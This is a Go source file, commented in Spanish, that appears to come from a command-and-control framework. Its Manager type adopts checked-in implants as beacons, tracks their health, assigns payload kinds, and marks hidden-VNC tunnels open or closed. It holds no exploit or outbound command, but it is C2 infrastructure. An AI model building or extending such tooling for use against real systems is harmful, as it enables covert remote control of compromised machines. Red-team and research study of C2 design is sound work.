package beacons

import (
	"context"
	"fmt"
	"log/slog"
	"sync"

	"github.com/google/uuid"
	"github.com/uLl0a/lavianc2/internal/events"
	"github.com/uLl0a/lavianc2/internal/models"
)

// ImplantLookup permite al manager resolver un implant real a partir de su
// ID (para adoptarlo como beacon). Interfaz pequeña; storage.ImplantRepo
// la satisface.
type ImplantLookup interface {
	Get(ctx context.Context, id uuid.UUID) (*models.Implant, error)
}

// Manager orquesta el subsistema multi-beacon: registry, FSM, monitor,
// payloads y adaptadores. Mantiene cada pieza desacoplada mediante
// interfaces pequeñas.
type Manager struct {
	Registry *Registry
	Monitor  *Monitor
	Events   *events.Bus
	log      *slog.Logger
	implants ImplantLookup // para adoptar implants reales (puede ser nil)

	mu      sync.RWMutex
	tunnels map[uuid.UUID]TunnelState
}

// NewManager crea el manager completo a partir de un store (puede ser nil)
// y un lookup de implants (para adopción; puede ser nil).
func NewManager(ctx context.Context, store BeaconStore, implants ImplantLookup, bus *events.Bus, log *slog.Logger) *Manager {
	reg := NewRegistry(store)
	rec := NewBusEventRecorder(bus, store)

	m := &Manager{
		Registry: reg,
		Events:   bus,
		log:      log,
		implants: implants,
		tunnels:  make(map[uuid.UUID]TunnelState),
	}

	// Al offline, notificar al resto del sistema (limpia sesiones/claves).
	onOffline := func(id uuid.UUID) {
		if bus != nil {
			bus.Publish(ctx, events.Event{
				Topic:   events.TopicImplantDead,
				Payload: id,
			})
		}
	}
	m.Monitor = NewMonitorWithPersister(reg, rec, store, log, MonitorConfig{OnOffline: onOffline})

	// Suscribir el manager a los check-ins reales del bus: adopta el
	// implant como beacon (si no lo está ya) y marca online.
	if bus != nil {
		bus.Subscribe(events.TopicImplantCheckin, func(c context.Context, ev events.Event) {
			id, ok := ev.Payload.(uuid.UUID)
			if !ok {
				return
			}
			m.adoptOrTouch(c, id)
		})
	}
	return m
}

// adoptOrTouch adopta un implant como beacon o, si ya está adoptado, marca
// su check-in (online + reset de racha).
func (m *Manager) adoptOrTouch(ctx context.Context, implantID uuid.UUID) {
	// Si ya está adoptado, TouchCheckIn basta.
	if _, ok := m.Registry.ByImplant(implantID); ok {
		m.Monitor.CheckIn(implantID)
		return
	}
	// Nuevo: resolver el implant para derivar nombre y perfil.
	if m.implants == nil {
		// Sin lookup, crear un beacon genérico asociado al implant.
		if _, err := m.Registry.Adopt(implantID, "", "", 0); err != nil {
			m.log.Warn("adopt: crear beacon genérico", "err", err)
		}
		m.Monitor.CheckIn(implantID)
		return
	}
	imp, err := m.implants.Get(ctx, implantID)
	if err != nil || imp == nil {
		m.log.Warn("adopt: implant no resoluble", "id", implantID, "err", err)
		m.Monitor.CheckIn(implantID)
		return
	}
	if _, err := m.Registry.Adopt(implantID, imp.Hostname, imp.SessionKey, imp.SleepInterval); err != nil {
		m.log.Warn("adopt: registrar beacon", "err", err)
	}
	m.Monitor.CheckIn(implantID)
	m.log.Info("implant adoptado como beacon",
		"implant", implantID, "host", imp.Hostname, "sleep", imp.SleepInterval)
}

// Start arranca el monitor.
func (m *Manager) Start(ctx context.Context) {
	m.Monitor.Start(ctx)
}

// Stop detiene el monitor.
func (m *Manager) Stop() {
	m.Monitor.Stop()
}

// RegisterBeacon registra un beacon.
func (m *Manager) RegisterBeacon(ctx context.Context, name, profile string, groupID *uuid.UUID) (*Beacon, error) {
	b, err := m.Registry.Register(ctx, name, profile, groupID)
	if err != nil {
		return nil, err
	}
	m.log.Info("beacon registrado", "id", b.ID, "name", b.Name, "profile", b.Profile)
	return b, nil
}

// Assign valida y marca la intención de enviar un payload a un beacon.
func (m *Manager) Assign(beaconID uuid.UUID, kind PayloadKind) error {
	b, ok := m.Registry.Get(beaconID)
	if !ok {
		return ErrNotFound
	}
	if err := AssignPayload(b, kind); err != nil {
		m.log.Warn("assign rechazado", "beacon", b.Name, "kind", kind, "err", err)
		return err
	}
	return nil
}

// OpenTunnel marca un túnel hVNC como activo en un beacon (solo short-haul).
func (m *Manager) OpenTunnel(beaconID uuid.UUID) error {
	b, ok := m.Registry.Get(beaconID)
	if !ok {
		return ErrNotFound
	}
	if err := AssignPayload(b, PayloadHVNC); err != nil {
		return err
	}
	m.mu.Lock()
	m.tunnels[beaconID] = TunnelActive
	m.mu.Unlock()
	return nil
}

// OpenTunnelForImplant resuelve el beacon asociado a un implant y abre el
// túnel hVNC. Es la entrada que usa el listener WebSocket, que conoce el
// implant_id (no el beacon_id).
func (m *Manager) OpenTunnelForImplant(implantID uuid.UUID) error {
	b, ok := m.Registry.ByImplant(implantID)
	if !ok {
		return fmt.Errorf("beacons: no hay beacon asociado al implant %s", implantID)
	}
	return m.OpenTunnel(b.ID)
}

// CloseTunnelForImplant cierra el túnel de un implant (resuelve su beacon).
func (m *Manager) CloseTunnelForImplant(implantID uuid.UUID) {
	if b, ok := m.Registry.ByImplant(implantID); ok {
		m.CloseTunnel(b.ID)
	}
}

// CloseTunnel cierra el túnel de un beacon.
func (m *Manager) CloseTunnel(beaconID uuid.UUID) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.tunnels[beaconID] = TunnelClosed
}

// TunnelState devuelve el estado del túnel de un beacon.
func (m *Manager) TunnelState(beaconID uuid.UUID) TunnelState {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.tunnels[beaconID]
}

// StopBeacon detiene administrativamente un beacon.
func (m *Manager) StopBeacon(id uuid.UUID) error {
	f, ok := m.Registry.FSM(id)
	if !ok {
		return ErrNotFound
	}
	f.AdminStop()
	b, _ := m.Registry.Get(id)
	if b != nil {
		b.State = StateAdminStop
	}
	return nil
}

// StartBeacon reactiva un beacon detenido administrativamente.
func (m *Manager) StartBeacon(id uuid.UUID) error {
	f, ok := m.Registry.FSM(id)
	if !ok {
		return ErrNotFound
	}
	f.AdminStart()
	b, _ := m.Registry.Get(id)
	if b != nil {
		b.State = f.State()
	}
	return nil
}

// Describe devuelve un resumen textual del estado de un beacon (para logs).
func (m *Manager) Describe(id uuid.UUID) string {
	b, ok := m.Registry.Get(id)
	if !ok {
		return "beacon no encontrado"
	}
	f, _ := m.Registry.FSM(id)
	state := HealthState("?")
	if f != nil {
		state = f.State()
	}
	return fmt.Sprintf("%s (%s) profile=%s state=%s racha=%d",
		b.Name, b.ID, b.Profile, state, f.FailStreak())
}
